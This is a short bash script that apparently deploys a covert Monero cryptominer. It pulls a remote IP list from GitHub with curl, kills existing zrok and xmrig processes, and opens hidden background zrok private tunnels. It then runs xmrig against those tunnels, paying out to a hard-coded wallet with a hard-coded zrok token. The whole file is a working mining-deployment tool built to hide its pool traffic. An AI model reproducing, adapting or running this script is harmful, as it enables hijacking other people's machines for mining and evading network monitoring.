#!/bin/bash

CONFIG_URL="https://raw.githubusercontent.com/Luisbuttocks/Miner_resources/refs/heads/main/Config86.json"
WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"

BIND_IPS=$(curl -s $CONFIG_URL)
pkill -f zrok
pkill -f xmrig-x86_64-st
./zrok enable 23hr12Uz33O1 > /dev/null 2>&1

for ip in $BIND_IPS; do
    echo "Binding bridge to $ip..."
    nohup ./zrok access private proxy1 --bind "$ip:9999" --headless > /dev/null 2>&1 &
done
sleep 5
XMRIG_CMD="./xmrig-x86_64-static"

for ip in $BIND_IPS; do
    XMRIG_CMD="$XMRIG_CMD -o $ip:9999 -u $WALLET -p worker_$RANDOM"
done

XMRIG_CMD="$XMRIG_CMD --donate-level 1 --tls false --keepalive true --nicehash true -t 4"

echo "Started"
$XMRIG_CMD 
